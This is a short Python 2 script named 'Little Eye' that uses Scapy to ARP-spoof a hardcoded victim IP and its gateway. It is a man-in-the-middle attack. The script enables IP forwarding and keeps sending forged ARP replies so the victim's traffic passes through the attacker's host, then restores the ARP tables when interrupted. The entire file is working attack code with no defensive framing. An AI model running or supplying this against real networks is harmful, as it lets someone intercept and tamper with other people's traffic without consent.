######################################
# Title - Little Eye
# Date - 07/09/2017
######################################
from scapy.all import *
import sys
import os

############Functions#################

def get_arp(ip):
	ans, unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")

def rearp():

	print "Retablissement."
	mac_victime = get_arp(ip_victime)
	mac_gw = get_arp(ip_gw)
	send(ARP(op = 2, pdst = ip_gw, psrc = ip_victime, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = mac_victime), count = 7)
	send(ARP(op = 2, pdst = ip_victime, psrc = ip_gw, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = mac_gw), count = 7)
	print "IP forward desactive."
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	sys.exit(1)

def mitm(gm,vm):
	send(ARP(op = 2, pdst = ip_victime, psrc = ip_gw, hwdst = vm))
	send(ARP(op = 2, pdst = ip_gw, psrc = ip_victime, hwdst = gm))

def littleeye():
	try:
		mac_victime = get_arp(ip_victime)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "Impossible de recuperer l'adresse MAC victime."
		sys.exit(1)

	try:
		mac_gw = get_arp(ip_gw)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "Impossible de recuperer l'adresse MAC gateway."
		sys.exit(1)

	while True:
		try:
			mitm(mac_gw, mac_victime)
			time.sleep(5)
		except KeyboardInterrupt:
			rearp()
			break




############Body######################

interface = "eth0"
ip_victime = "10.94.73.40"
ip_gw = "10.94.73.254"

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

littleeye()
